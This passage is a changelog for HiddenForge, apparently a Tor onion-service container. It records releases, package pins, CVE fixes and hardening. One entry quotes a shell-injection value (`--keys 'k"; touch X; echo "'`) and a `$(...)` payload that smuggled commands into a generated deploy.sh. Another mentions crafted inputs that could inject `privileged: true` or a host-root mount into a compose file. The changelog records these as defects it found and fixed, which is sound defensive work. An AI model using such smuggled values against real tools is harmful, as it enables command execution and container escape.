# Changelog

All notable changes to HiddenForge are documented here.

The latest release is **3.0.0**; its image digest and signatures are in
`signatures/` on master (a release's signatures are committed after its tag).
3.0.0 is signed with ML-DSA-65 only, as 2.1.x is. `v2.0.5` is a git tag with no
image of its own: its changes ship with 2.1.0.

---

## [3.0.0] - Unreleased

A new image from the ground up. Same compose files, same keys, same address,
same commands. What is inside the container is different, and much smaller.

### Why

2.1.x was Alpine plus Python. Every time Alpine shipped a security update it
removed the old package from its index, the pinned build stopped resolving, and
a release was needed to catch up. Each one brought Python and its libraries back
into the CVE count. 3.0 removes the reason that kept happening: the image
contains Tor, the libraries Tor links, and one small binary, built offline from
inputs this project archives and verifies.

### The image

- **Base: Docker Hardened Images `dhi.io/static` (musl, Alpine 3.23), used
  unchanged.** The image is that base by digest plus one layer. There is no
  shell, no package manager and no Python in it. 40 MB, down from 107 MB.
- **Zero known vulnerabilities at every severity**, from two scanners (trivy and
  grype), on both architectures. CI fails a build on any finding, negligible
  included, and the nightly watchdog alerts on any severity.
- **Tor 0.4.9.16, compiled from Tor Project's release tarball.** The tarball's
  SHA-256 file carries signatures from Tor's release keys; both are checked
  against the fingerprints Tor publishes before the tarball is archived, and the
  build checks the hash again. The relay and directory-authority code is compiled
  out (`--disable-module-relay`): an onion service never runs it. Built with
  `-D_FORTIFY_SOURCE=3`, fortify-headers and `-fstack-clash-protection`.
- **The runtime is one Rust binary.** The entrypoint, the in-image CLI, the
  healthcheck, the vanity wrapper and the guard monitors are a single program
  with one crate dependency (`libc`, vendored and checked against `Cargo.lock`).
  It links the image's own libcrypto, so there is one OpenSSL in the image.
- **The guard monitors are native.** Vanguards' bandguards and rendguard were
  ported from the Python addon. The port was run side by side with the Python
  original against the same control-port traffic and made the same decisions,
  down to the same 54 circuit closes. stem and the Vanguards package are gone
  from the image. Tor's own vanguards-lite stays pinned on.
- **The torrc is byte-identical to 2.1.6** for the same environment, checked by
  21 fixed cases and 400 generated ones.

### Hardening

- **Landlock.** The supervisor confines itself after start-up, and every helper
  it starts gets a stricter domain of its own, with TCP denied.
- **No core dumps and no ptrace attach** for any HiddenForge process
  (`RLIMIT_CORE` 0, not dumpable). A crash cannot write key material to disk.
- **The supervisor holds no `CAP_KILL`.** It signals the tor user's processes
  through a helper running as tor. Measured capability sets are unchanged from
  2.1.6: `CapEff 0xc2` under Docker, `0xc0` under rootless Podman, and nothing
  at all for Tor and the monitors.

### New, opt-in

- **No-root mode.** `hiddenforge setup --no-root` writes a fragment that starts
  the container as the tor user with no capabilities at all. Nothing runs as
  root, even at start-up. `doctor` recognises it.
- **Key encryption at rest.** `hiddenforge setup --encrypt-keys` (with
  `--passphrase-file`) seals the service key on the volume with AES-256-GCM under
  an scrypt-derived key. At every start the key is decrypted into RAM for Tor.
  An existing plaintext key is sealed on first start: the sealed copy is proven
  to decrypt to the same bytes before the plaintext is overwritten and removed.
  A container that has only the sealed key and no passphrase refuses to start
  rather than generate a new address. This protects a volume, disk or backup
  taken while the service is stopped. It does not protect a running host, or a
  passphrase stored beside the volume. `hiddenforge unseal-keys` turns it off
  again: with the service stopped it puts the plaintext key back, checks it
  reads back as the sealed key's content, and only then removes the sealed copy.
- **Offline setup wizard.** `wizard/hiddenforge-wizard.html` is one file you
  open from disk. It makes no network request of any kind (its Content Security
  Policy forbids every connection, form submission and external load) and writes
  exactly what `hiddenforge setup` writes for the same answers.

### Fixed

- Under the shipped Podman file the `<name>.onion` file is now written to the
  key volume, and `podman exec <container> hiddenforge show` and `doctor` work
  as root (2.1.6 printed a Python traceback). Root there cannot enter the tor
  user's directory, so the read is done as tor.

### Compatibility

- Every command 2.x ran inside the container still works: the healthcheck
  (`su-exec tor python3 /usr/local/bin/healthcheck.py`), `cat` of the hostname,
  `su-exec tor cat ...`, `test -S`, the 2.1.x doctor's runtime probe, and the
  CLI subcommands. Each of those names answers only the exact forms 2.x used
  and refuses anything else, so the image gains no general-purpose tool.
  Replaying 18 such commands against 2.1.6 and 3.0 gave the same exit codes and
  output.
- `TOR_SANDBOX`, `*_TOR_SERVICE_HOSTS` and every documented variable behave as
  in 2.1.6.

### Build and supply chain

- **The build is offline.** Every package, the Tor tarball and the vendored
  crate come from an input archive passed as a build context; nothing is fetched
  while building. `scripts/build_inputs.py verify` checks the archive first: every
  file against its manifest, each package index against a signing key pinned in
  `signatures/` (Docker's DHI apk key, Alpine's keys), every package against its
  signed index, and the Tor signatures against Tor's release keys.
- **Alpine pruning can no longer break a release build.** The inputs are kept
  for the current release and the one before it.
- **Reproducible**: two clean builds give byte-identical images.
- `pin-freshness` is replaced by `inputs-integrity`, and `scripts/check_pins.py`
  and `scripts/bump_pins.py` are gone: there are no apk pins left to check.

### Upgrading

From any 2.1.x release nothing is needed: same compose file, same key volume,
same address. Rolling back to 2.1.6 with the same volume also works. 2.1.6
cannot read a sealed key: to roll back from `--encrypt-keys`, stop the service
and run `hiddenforge unseal-keys` first.

---

## [2.1.6] - 2026-11-03

Updates `musl`. Nothing else in the image changed.

### Security

- **`musl` and `musl-utils` `1.2.5-r23` to `1.2.5-r24`**, clearing CVE-2026-107891.
  musl is the C library every program in the image links against, and the base
  image ships the old version. It is now pinned explicitly. With this, trivy
  reports no finding at any severity.

### Changed

- The comment on the 2.0.x release-signing key in `allowed-signers` and in the
  CLI's pinned copy no longer names a machine. The key itself is unchanged.

### Upgrading

From any 2.1.x release nothing is needed: same compose file, same keys, same
address.

---

## [2.1.5] - 2026-11-03

Updates `libexpat`. Nothing else in the image changed.

### Security

- **`libexpat` `2.9.0-r0` to `2.10.0-r0`**, clearing CVE-2026-117610 (NULL pointer
  dereference) and CVE-2026-118370 (signed integer overflow), both rated HIGH by
  trivy. python3 depends on libexpat and the base image ships the old version.
  Nothing in the image parses XML, but the library is installed. It is now pinned
  explicitly, like openssl and zlib, so a scanner finding in it means a version bump.

### Upgrading

From any 2.1.x release nothing is needed: same compose file, same keys, same
address.

---

## [2.1.4] - 2026-10-30

Updates Tor, and puts the license text and image labels in the image.

### Security

- **`tor` `0.4.9.14-r0` to `0.4.9.15-r0`.** Alpine no longer carries 0.4.9.14, so
  the old pin could not be installed and the image could not be rebuilt from
  source. Tor 0.4.9.15 is the version in Alpine's current index.

### Added

- **The license and image labels travel with the image.** The GPL-3.0 text is at
  `/usr/share/licenses/hiddenforge/LICENSE`, and the image carries the
  `org.opencontainers.image.*` labels `title`, `description`, `version`, `source`
  and `licenses`. The labels hold fixed text, because a build date or commit id would
  give every build of the same source a different digest. `tests/test_version_consistency.py`
  now checks the version label too.
- **`scripts/bump_pins.py`.** Moves an apk pin that Alpine has pruned to the version
  its index carries now, together with the Tor version the CLI and `manifest.json`
  also state. The nightly watchdog uses it to prepare a candidate fix (build, scan
  and tests) when a pin disappears.

### Changed

- Some startup and supervisor messages have slightly different wording; the
  conditions that print them did not change.
- The build context holds only the files the Dockerfile copies: `LICENSE` and
  `tests/test_torrc.py`.

### Upgrading

From any 2.1.x release nothing is needed: same compose file, same keys, same
address.

---

## [2.1.3] - 2026-10-28

Updates the Python runtime. Nothing else in the image changed.

### Security

- **`python3` `3.12.15-r0` to `3.12.16-r0`**, clearing CVE-2026-115557 (trivy:
  CRITICAL; Python adds a denylist of compromised certificates to its TLS
  handling). HiddenForge's Python code does no TLS parsing, but the runtime of a
  Tor service should not carry a flagged version.

### Fixed

- **The image could not be rebuilt from source.** Alpine pruned
  `python3=3.12.15-r0` from its index, so `apk add` failed. This is the same
  failure as for earlier pins; the scheduled `pin-freshness` job reported it.

### Upgrading

From 2.1.0, 2.1.1 or 2.1.2 nothing is needed: same compose file, same keys, same
address.

---

## [2.1.2] - 2026-10-22

Fixes a directory-mode defect 2.1.1 introduced. The software in the image is
unchanged from 2.1.0. Use 2.1.2 rather than 2.1.1.

### Fixed

- **2.1.1 shipped `/opt/hiddenforge` and `/usr/local/bin/tests` as mode 0644.**
  A directory that `COPY --chmod=0644` creates takes the file's mode (measured,
  BuildKit v0.30.0), and a 0644 directory cannot be entered by any non-root
  user. Nothing at runtime reads those paths as non-root, so no behaviour
  changed, but the machine contract at `/opt/hiddenforge/manifest.json` was
  unreadable to the `tor` user (as it was in 2.1.0, where the file itself was
  0660). Both directories are now created 0755 before the copies, the
  manifest is readable by every user, and `tests/test_dockerfile.py` fails on
  any `COPY` into a directory that nothing created first.

---

## [2.1.1] - 2026-10-22

A reproducibility fix. The software in the image is unchanged from 2.1.0;
the image digest is new, because the layers now record fixed file modes.

### Fixed

- **2.1.0 reproduced only for a builder with the release builder's umask.**
  A `COPY` without `--chmod` records the mode the file has in the build
  context, and a fresh clone gets its modes from the cloner's umask. The same
  commit cloned under umask 007 and under 022 built two different index
  digests; the `RUN chmod 755` after the copies fixed the final modes but not
  the `COPY` layers underneath. Every `COPY` now states its mode, the
  `RUN chmod` is gone, and `tests/test_dockerfile.py` fails on any `COPY` or
  `ADD` without `--chmod`. Measured on this tree: clones under umask 007 and
  022 (entrypoint.py 0660 and 0644 in the context) build the same amd64 index
  digest.
- **The CI `reproducibility` job could not have caught that.** It built one
  checkout twice under one umask. It now clones the commit twice, under umask
  007 and 022, and compares those two builds; it also turns off `--sbom` and
  drops the job token from `.git/config` before running repository code.

---

## [2.1.0] - 2026-10-21

### Summary

- **A host CLI and a machine contract.** `hiddenforge setup`, `show`, `status`,
  `doctor`, `verify-image`, `sbom`, `backup`/`restore`, `encrypt-key`, `rotate`,
  `vanity` and more, plus `version --json` / `info --json` and `manifest.json`,
  so another program can adopt HiddenForge without reading the source. 2.0.4 had
  none of this.
- **Readiness means reachable.** `ready` is reported only after this Tor has
  uploaded the onion service descriptor, so a client can connect the moment it
  is reported.
- **It heals itself.** A backend that changes IP, comes up late, or is missing
  at boot is followed automatically; Vanguards is paused and retried rather than
  given up; Tor dying restarts the container with the same address.
- **Rootless Podman is supported end to end**, including real reboots.
- **Reproducible two-platform image** (amd64 and arm64): two independent builds
  from a clean checkout produce the same index digest.
- **Security fixes** (below), including the end of `seccomp=unconfined`.

### Security

- **`seccomp=unconfined` removed from both compose files.** It was justified by
  a claim that Tor's `Sandbox 1` needs it, which was false: Tor's sandbox is an
  in-process filter that stacks on the runtime's profile. Running unconfined
  left the root Python supervisor and Vanguards with no syscall filter at all.
  The engine's default profile now applies, and `doctor` fails a container that
  still sets `unconfined`.
- **Pinned packages refreshed:** `tor` 0.4.9.11 to 0.4.9.14, `python3` to
  3.12.15 (clears CVE-2026-19445, CVE-2026-19553, CVE-2026-82049), `openssl`
  pinned explicitly at 3.5.9 instead of the base image's vulnerable 3.5.7
  (CVE-2026-14456 and others), `zlib` pinned at 1.3.2-r1 (CVE-2026-85091, a heap
  overflow on data Tor receives from relays). `trivy` reports no known
  vulnerability in the image at any severity.
- **pip:** `setuptools` 82.0.1 to 84.0.0 (CVE-2026-59890; build-only, removed
  from the final image), and the unused Python 2 `ipaddress` backport removed so
  it no longer shadows a stdlib module.
- `ulimits.nproc` removed: it is counted per host uid, so on a busy host it
  stopped Tor from starting at all. `pids_limit` remains the cap.
- No DNS query leaves the tor container (`dns: 127.0.0.1`).

### Upgrading from 2.0.4

Keys, the key volume layout and `*_TOR_SERVICE_HOSTS` are unchanged, and an
upgrade followed by a rollback keeps the same onion address. A compose file
copied from 2.0.4 needs these changes: remove `seccomp=unconfined` and
`ulimits.nproc`; add `dns: 127.0.0.1`; keep a restart policy (it is now
required, because the container exits on purpose to pick up a moved backend).
`ready` arrives later than before. A symlinked service directory in the key
volume now stops the container with an error; a hard-linked key file is left
alone with a warning instead of being taken over. The README section
"Upgrading from 2.0.4" has the table.

### Detailed record

Everything below is the full record of the 2.1.0 work, newest first within each
round, including defects that were found and fixed before release.

Mutation testing works, and the code it found wrong is fixed. The previous
artifact recorded 787 generated mutants and **0 checked**. A full run now reports
**2,247 mutants, 2,175 killed (96.8%), 69 survived and every one of them
explained in writing**, with zero mutants that no test reaches;
`scripts/mutation_gate.py` fails the build on any survivor that is not accounted
for, on any module that stopped being graded, and on any mutant that hangs
without a written reason. It was itself checked for the opposite failure on each
of those paths by removing an entry and confirming it goes red.

Re-run on the release tree (2026-10-19): **2,724 mutants, 2,647 killed (97.2%),
73 survived, every one explained**, 4 documented hangs. Getting there fixed two
defects in the measurement itself. Two healthcheck test files loaded the module
under another name, and mutmut picks mutants by `__name__`, so those tests never
saw a mutant. And the gate blanked each function's `def` line before diffing,
which hid every mutation of a default argument; seven allowlist entries existed
only because of that, and are gone. The defaults that decide timing and limits
are now pinned by `tests/test_kill_defaults.py`.

Three things this work had left unmeasured are now measured rather than argued:
the `mutation` CI job was executed end to end with `forgejo-runner exec` and
reproduced the result from a clean hash-pinned venv (`Job succeeded`); the live
acceptance suite ran against an image built from this tree and published a real
`.onion` (3 passed in 244s); and the fuzz target was re-run, where it crashed on
its second input and the bug was in the invariant. It compared line counts, and
`shlex.quote` puts a newline inside single quotes, which adds a line while adding
nothing executable. It now compares structure, the parsed YAML keys and the shell
words, and ran 162,177 inputs clean.

mutmut's own `timeout` verdict turned out not to be one: its bound is wall clock,
and re-grading the 17 timeouts alone found 3 real hangs, 7 kills, and **7
survivors the gate had been counting as caught**, two of which nothing explained.
The gate now re-grades every timeout itself rather than trusting the label.

A second pass, driven by running the real container rather than reading it, found
eight more. The container was brought up from the shipped compose file and checked
from the inside against `/proc`, and the key-handling commands were driven against
a key volume the image itself generated.

The two worst were in `restore`, the command an operator reaches for when the
identity is already lost. It reported `ok: true` over an archive that decrypted
but carried no key at all, leaving an empty volume behind a success message; and
it accepted member names carrying control characters, the one input channel into
the key volume that skipped the name validation `--keys` and `--name` both get.

The third was in CI rather than in the code, and it hid the most serious defect
this project has had. PyYAML was in no CI requirement file, so the two tests that
prove a crafted `--keys` cannot smuggle `privileged: true` or `/:/host` into the
operator's compose file called `pytest.importorskip` and silently skipped. The
mutation spot-check is what caught it: the container-escape mutation came back
SURVIVED in CI and killed locally. The dependency is now pinned with hashes, and
those two tests fail loudly rather than skipping if it is ever absent again.

Fifteen defects were found: seven because a mutation of them survived, five by
reading `scripts/hiddenforge` (which mutmut cannot mutate, because it has no
`.py` extension), and three by taking a single finding and asking the same
question of its whole family. The most serious are all in the key-handling and
supply-chain paths: a restore that followed a symlinked directory already in the
key volume, a `--delete-plaintext` that destroyed an unrecoverable identity
without verifying the archive, a `verify-image` that printed VERIFIED for a
stripped post-quantum signature, and `--keys` and `--container` values that were
both injectable into the compose fragment and the 0755 deploy script.

### Fixed (pin refresh, 2026-10-04 and 2026-10-19)

- **The Dockerfile could not be built from scratch.** `tor=0.4.9.13-r0`,
  `python3=3.12.14-r0` and `openssl=3.5.8-r0` had been pruned from Alpine's v3.23
  index, so a `--no-cache` build failed at `apk add` (a cached build hid it, which
  is how it went unseen). Bumped to `tor=0.4.9.14-r0`, `python3=3.12.15-r0` and
  `openssl=3.5.9-r0`. The old python3 also carried HIGH CVEs with fixes available
  (CVE-2026-19445, CVE-2026-19553, CVE-2026-82049); `trivy --severity HIGH,CRITICAL`
  on the rebuilt image reports 0. `scripts/check_pins.py` passes against the live
  index. The base image digest is unchanged.
- **zlib is now pinned to `1.3.2-r1`.** The base image's `1.3.2-r0` carries
  CVE-2026-85091 (heap buffer overflow, MEDIUM). Tor links zlib to decompress
  directory documents it receives from relays, so it is pinned explicitly like
  `openssl` instead of being inherited from the base.
- **The CLI advertised a Tor version the image no longer installed.**
  `TOR_VERSION` (shown by `info` and recorded in `manifest.json`) was a separate
  constant that nothing compared with the Dockerfile's apk pin. A test now fails
  if the two differ.

### Fixed (found by exercising the product, 2026-09-26)
- **`backup` could report success over an archive with no key in it.** On a
  running deployment each service directory belongs to the container's tor
  user, and `Path.rglob` silently skips a directory it cannot read: from the
  host user's account `backup` exited 0, `ok: true`, over a 307-byte archive
  holding only `<name>.onion`. An operator relying on it had nothing. Any
  unreadable directory now aborts the backup with the way to run it (`sudo`
  under Docker, `podman unshare` under rootless Podman -- both measured to
  produce a complete archive that restores to the same address), and a volume
  with no identity in it is refused.
- **`doctor` failed for ever over a retired service's kept keys.** The
  container's own key check sees only configured services, so a service
  directory an operator kept after removing the service was reported as an
  unverified FAIL on every run. Found by the readiness pass (a service removed
  from the configuration, its keys left in the volume). It is now a warning
  that says so; a CONFIGURED service the container is silent about still fails.
- **`backup` and `encrypt-key` wrote through whatever was at the output
  path.** Both opened an existing file with O_TRUNC, and O_NOFOLLOW does not
  stop a hardlink: the ciphertext went into the file the link shared an inode
  with. `encrypt-key` writes into the key volume, which the threat model treats
  as possibly restored from untrusted media. Both now write a fresh file and
  rename it into place (fsynced), the pattern the rest of the CLI already used.
  And a backup made with the documented `sudo hiddenforge backup` was owned by
  root, so the operator could not move it off the box without sudo again; it
  now belongs to the invoking user. Measured on the soak's live tor-owned
  volume: the sudo backup was the user's, moved without sudo, and restored to
  the address the running service serves.
- **`setup` wrote an unparseable fragment for a key path with a character
  outside the Basic Multilingual Plane** (an emoji, for example). The path was
  encoded with json.dumps, which writes such a character as a UTF-16 surrogate
  pair; YAML reads that as two invalid code points. Measured: Docker Compose
  refused the fragment ("invalid Unicode character escape code"), and a lenient
  parser decoded a different path. It now uses YAML's own escapes (`\U` for
  those characters); Docker Compose reads the exact path back. Found by a new
  CI property test: for any key path the validator accepts, on both runtimes,
  deploy.sh keeps the same shell words and the fragment the same keys and the
  exact mount -- the invariant the coverage-guided fuzz target checks, now in
  CI, which had passed while the deploy.sh injection below was present.
- **(Found before release, in a change made during this cycle.)** The
  `deploy.sh` status hint added above first put the shell-quoted key path
  inside an echo's double quotes, so a path containing `"` closed them and the
  rest ran as shell: measured, `--keys 'k"; touch X; echo "'` made deploy.sh
  run `touch X`. The fuzz target's structure check caught it. The line is now
  one printf argument, shell-quoted whole; a regression test runs it with that
  payload and a `$(...)` payload and checks nothing executes.
- **After a reboot, a rootless Podman onion stayed down.** Podman's boot
  service (`podman-restart.service`) starts only containers whose restart
  policy is `always`; `podman-compose.yml` and the Podman `setup` fragment used
  `unless-stopped`. Measured with real reboots on Ubuntu 24.04, linger and the
  boot service enabled: `unless-stopped` left both containers Exited; `always`
  brought them back ready with the same address. The Podman files now use
  `always`, the README says to enable linger and the boot service, and
  `doctor` checks all three (and fails a container with no restart policy on
  any engine, since the container heals by exiting and being restarted; a
  container run by a systemd unit whose main process is its conmon is a
  warning to verify instead, since doctor cannot prove the unit recreates
  it). On
  Docker, three real reboots each came back on their own with the same address.
- **The generated `deploy.sh` misled.** It printed the address the moment Tor
  wrote the key (before it worked), told the operator to "check the container
  logs" (logging is off by design), and under Podman named an address file that
  is never written there. It now says the address works once `status` reports
  ready, points at `hiddenforge status`, and names only files that exist.
- **`status` could say `ready: true` beside a reason saying it was not.** When
  the engine reported a health status, `status` believed it over the fresh
  in-container check it had just run -- but Docker re-runs the healthcheck only
  every 60s and needs three failures to flip, so for minutes after, say,
  Vanguards died, `status` answered ready with the reason "Vanguards addon is
  NOT running". Every opinion available (the engine's, when it has one, and the
  fresh probe's) must now agree.
- **"Ready" and the address file came about 45 seconds before the address
  worked.** Readiness required introduction circuits, but a client finds a
  service through its descriptor on the HSDirs, and Tor uploads that after the
  circuits. Measured on a fresh service: ready and `<name>.onion` at 11:17:58,
  descriptor uploaded at 11:18:40-42, every client fetch in between failed;
  after a restart the network still held the previous run's descriptor, naming
  introduction points that no longer existed. No control-port query reports an
  upload, so the entrypoint now runs a watcher (as the tor user, started the
  moment the control socket exists) that records Tor's HS_DESC UPLOADED events,
  and a service is reachable only once this Tor has uploaded its descriptor. It
  gates the address file, `ready`, `status` and the health status alike.
  Measured on the new image: ready one second after the first upload on a fresh
  key and in the same second after a restart, and a fetch made at that moment
  returned HTTP 200 both times.
- **`setup --runtime podman`'s deploy.sh uses Docker Compose on the Podman
  socket when it can.** It used podman-compose unconditionally, so a generated
  deployment silently ran without the process and swap limits. It now prefers
  the Compose binary on the rootless Podman socket and falls back to
  podman-compose with a warning. Measured on stock Ubuntu 24.04: the generated
  script chose Compose, the container had pids.max 256, memory.swap.max 0,
  restart `always`, no healthcheck; `status` ready, `doctor` clean.
- **Podman users can now get every limit the compose file declares.** Docker
  Compose v2 on the rootless Podman socket applies `pids_limit` and
  `memswap_limit`, which podman-compose drops; it needs only the Compose binary
  (`apt install --no-install-recommends docker-compose-v2`), not the Docker
  engine. Measured on stock Ubuntu 24.04 with no Docker engine installed:
  pids.max 256, memory.swap.max 0, DNS isolated, ready, Tor killed and the
  container restarted with the same address, HTTP 200 over Tor. The README and
  `podman-compose.yml` now lead with it; podman-compose stays documented with
  its gaps.
- **Under rootless Podman the container could stay down instead of healing.**
  Rootless Podman 4.9 (Ubuntu 24.04's version) runs healthchecks through
  systemd user timers, and when no systemd user manager is reachable -- a
  service account with no login session, `sudo -iu`, cron, a broken user bus --
  it never restarts a container that has a healthcheck. Measured on Ubuntu
  24.04: with any healthcheck, `restart: unless-stopped` left the container
  stopped after exit 1; with none it restarted every time, with or without a
  session (rootful 4.9 and rootless 5.4 restart either way). This container
  recovers by exiting and being restarted: after Tor dies, when a backend moves,
  when a late backend comes up. `podman-compose.yml` and the `setup --runtime
  podman` fragment now declare no healthcheck at all (not even `disable: true`,
  which Docker Compose sends to Podman as test [NONE] and Podman 4.9 still
  treats as a healthcheck). Measured on both podman-compose and Docker Compose
  over the Podman socket: Tor killed, container restarted, same onion, ready,
  HTTP 200 over Tor. Readiness under Podman is `hiddenforge status`, which runs
  the check itself when the engine reports no health; the Docker files keep
  their healthcheck, since Docker restarts with one.
- **A backend that was down announced itself to the host's DNS.** The
  engine's resolver answers backend names on the internal network, but forwards
  a name it cannot answer to the host's upstream DNS -- and the supervisor
  re-resolves backend names every 30s, so a backend outage became a query to
  the upstream every 30s, starting exactly when the onion lost it. Measured on
  Docker and rootless Podman. The compose files and the `setup` fragment now set
  `dns: 127.0.0.1` (nothing listens there): measured, internal names still
  resolve, zero queries left over 72s of backend downtime, Tor bootstrapped and
  served HTTP 200 on both engines. `doctor` warns when a container lacks it.
- **The vanity generator ran with networking on.** `hiddenforge vanity` makes a
  secret key inside a container that had the default network. It now runs with
  `--network none` and `no-new-privileges` (measured: key generated, prefix
  matched, files owned by the caller). The README's offline-key steps point at
  it instead of a separately built mkp224o.
- **Vanguards could be switched off for the life of the container.** After six
  quick failures the supervisor disabled the addon for good: bandguards and
  rendguard stayed off until someone restarted the container by hand, and
  nothing does that for an unhealthy container. It now pauses for ten minutes
  and tries again with a fresh budget. Measured by killing the addon six times
  in a running container: paused, back 600s later, ready again, no container
  restart. The healthcheck's reason no longer says a restart is the only fix.
- **Nobody but the maintainer could check the post-quantum signature.**
  `verify-image` needed `pqsign`, the signer's own tool, which is published
  nowhere, and refuses a hybrid signature with one half unchecked -- so for
  everyone else it failed, or passed only with `--allow-classical-only`. pqsign's
  files are a 16-byte header over the standard FIPS 204 encoding, so the CLI now
  verifies with stock OpenSSL 3.5 or later (an independent, widely reviewed
  implementation), falling back to pqsign where OpenSSL is older. Measured on
  Alpine 3.23 with no pqsign: `verify-image sambent.dev/sam/hiddenforge:2.0.4`
  compared the registry digest, verified both signatures, `VERIFIED`, exit 0; a
  digest with one byte appended fails. The docs give the same check as a
  four-line OpenSSL recipe, tested under busybox sh and bash.
- **The CLI said nothing about which Python it needs.** It uses 3.10 features,
  so on 3.9 it would start and then crash part-way through a command. It now
  refuses to start below 3.10 and says why; the host CLI tests pass on 3.10. The
  README says how to install it (where `sudo` finds it, for `backup`).
- **A backend that was not up at boot left the container serving nothing, and
  reporting healthy.** After a host reboot the runtime starts containers in no
  set order (`depends_on` applies only to `compose up`). Measured: with the
  backend not yet running, its name did not resolve, the service was dropped,
  Tor ran with no onion service at all -- and the healthcheck reported ready and
  healthy, because with no service every per-service check passed vacuously. It
  never recovered: 90s after the backend came up, still no service and no
  restart. Now a name that fails to resolve is watched like a moved one, and
  once it resolves on two lookups in a row the container restarts and configures
  it (measured: restarted 39s after the backend came up, ready, and the onion
  served HTTP 200 over Tor). A container with no configured service is never
  ready, and an unreadable torrc is "cannot evaluate" rather than "no services".
- **A recreated backend no longer blackholes the onion.** Names are resolved
  into the torrc at start; a backend recreated on a new IP left every request
  going to an address nobody listened on, with the healthcheck green. The
  supervisor now re-resolves every 30s and, on two successful lookups in a row
  that no longer include the old IP, exits so the restart policy restarts it
  with a fresh lookup. Measured live: a moved backend was followed in about a
  minute and served at its new IP; a backend that was simply down for 80s
  caused no restart.
- **A service directory the operator created was left world-readable, and Tor
  refused it.** Startup only chmod'ed directories root owned, so one made on the
  host -- as the README's offline-key steps do -- kept its umask mode (0775):
  measured in a real container, Tor refused it as "too permissive" and never
  started. It is now set to 0700 through a no-follow descriptor whoever made it;
  where the runtime forbids that, startup stops with the exact fix.
- **A symlink or file at a service path failed as a bare "File exists"**; it is
  now refused by name before anything uses it.
- **A Tor that died at startup went unnoticed for two minutes** while the
  supervisor waited for its control socket; the wait now ends at once.
- Verified by a hostile key-volume battery against the real container (symlinked
  and hardlinked keys, FIFOs, sockets, `/dev/zero` links, a 700 MB file, control
  characters in names, a symlinked address file): nothing outside the volume was
  touched in any case.
- **The supervisor ran the reachability probe every second** while an address
  waited to be published (a Python process and a control connection per
  second, for minutes on a slow network). A "not yet" is now remembered for 10s;
  a "yes" is never delayed.

### Fixed (rootless Podman, measured live, 2026-09-25)
The runtime this project recommends for high-risk deployments, brought up from
the shipped `podman-compose.yml` and driven through the documented flow.
- **`status` could never report `ready` under rootless Podman.** It ran the
  in-container healthcheck as root, who cannot reach the control socket there
  (no `DAC_OVERRIDE`), and took that "Permission denied" as the service's state;
  every address was unreadable from the host; and with no engine health status
  `ready` could not be true. The service meanwhile had 11 established
  introduction points. Now: the healthcheck runs as `tor`, addresses the host
  cannot read are filled from the container, and with no engine health status
  the same healthcheck's verdict stands in. Proven on the live stack.
- **`show` could never give the address under rootless Podman**, so the
  documented flow (poll `status`, then `show`) dead-ended. `show --container`
  reads it from inside, as `tor`.
- **Podman had no healthcheck at all** -- including for the published image:
  the image's `HEALTHCHECK` is a Docker extension the OCI format does not carry,
  and Podman ignores it. Both compose files now declare it.
- **podman-compose silently leaves limits unapplied**: `pids_limit` before 1.1
  and `memswap_limit` in every version (read from its source, measured live).
  `doctor` now measures capabilities, `pids.max` and `memory.swap.max` inside
  the container instead of trusting the engine's report -- which also removes
  its false "missing CHOWN/SETUID/SETGID" on every Podman container.
- **A rootless Podman container could not survive its own restart.** The first
  start worked; every restart exited 1 with "Permission denied" on the service
  directory, a silent restart loop under `logging: driver: none`. Root there
  has no `DAC_OVERRIDE`, so it cannot open a directory a previous start handed
  to the tor user. That directory is already in the state startup produces, so
  it is now accepted when -- and only when -- `lstat` shows a real directory,
  owned by tor, closed to others. Proven: a fresh boot and two restarts, each
  back to `ready` with the same address.
- **`status` stayed not-ready while Podman's health said "starting" for good**
  (its healthchecks run from systemd timers, which a host without a user
  session never fires). The in-container probe is the same script, so its
  verdict stands in until the engine has a result of its own; "unhealthy" from
  the engine is still believed.
- `setup`'s `deploy.sh` reads the address as the tor user on every runtime,
  instead of relying on root's `DAC_OVERRIDE`.
- **`rotate` could never work inside the container**: it renamed the key
  volume, which is a mount point there (`EBUSY`). On a mount point it now moves
  the contents into `.rotated-<epoch>/`; if any entry cannot be moved, nothing is.

### Fixed (pre-publication pass, 2026-09-25)
Found by running the shipped configurations live, reading every public document
against the code, and scanning the whole history before anything is published.
- **A hardlink in the key volume could destroy the onion identity.** The
  supervisor publishes `<name>.onion` through a temp file whose name was
  predictable (`.<name>.onion.tmp.1`, the supervisor being PID 1) and which it
  opened with `O_TRUNC`; `O_NOFOLLOW` does not stop a hardlink. A key volume
  arriving with that name linked to `hs_ed25519_secret_key` had the key
  overwritten with the address and made world-readable, as root. The temp file
  now has a random name and is created with `O_EXCL`, so it is always a new inode.
- **A tampered or mismatched pip package did not fail the image build.** The
  Vanguards `RUN` chained `pip install --require-hashes ... && ... && grep -q ...
  && pip uninstall ... || true && ...`, which the shell parses as
  `(... ) || true && ...`: a hash mismatch, or the check that the compatibility
  patch applied, was swallowed and the build succeeded with a broken venv. Each
  tolerated step is now grouped; a build with one corrupted hash was run and now
  fails, and a test keeps a bare `|| true` out of the Dockerfile.
- **`setup` could crash with a traceback and a half-written output set** when an
  output path was a symlink or directory. All four targets are checked before
  any is written, and any filesystem error is a JSON error with exit 1.
- **A socket in the key volume stopped the container from starting** (a
  regression in this pass's hardlink fix: sockets cannot be opened). It is
  skipped with a warning, as device nodes are.
- **Three more writes that could land on an inode that was not theirs**, found
  by a further check hunting the same class. Startup's recursive chown
  followed a hardlinked file out of the service directory (it now chowns through
  a descriptor and declines to chown any file with more than one link, with a warning; exploitable only
  where `fs.protected_hardlinks` is off). `setup --force` wrote through a
  hardlinked output file (output is now a fresh `O_EXCL` temp renamed into
  place). And `restore`/`decrypt-key` extraction could write through a hardlink
  planted after the conflict scan (the write is now `O_EXCL`; duplicate archive
  members are refused).
- **A FIFO or an endless file in the key volume could stop or kill the
  supervisor.** Its once-a-second reads of `hostname` and `<name>.onion` blocked
  for ever on a FIFO (a dead Tor then went unnoticed) and read a link to
  `/dev/zero` until `MemoryError`, which escaped the handler and killed PID 1.
  They now read through `O_NOFOLLOW|O_NONBLOCK`, accept only regular files, and
  are size-capped; the healthcheck and the CLI read the same way.
- **`doctor` failed the recommended Docker deployment.** From the host each
  service directory is tor-owned 0700, so the key-mode check hit EACCES and
  failed every service -- via the command `docs/INTEGRATION.md` gives for
  verifying a deployment. The modes are now checked from inside the container as
  the tor user; if the container cannot be asked, that is a named warning.
- **`show` said "not generated yet" for a key that exists** but that the host
  cannot read, which under rootless Podman is permanent. It now says which case
  it is (exit code unchanged, 4).
- **`status` could answer not-ready with no reason**, when Docker's health status
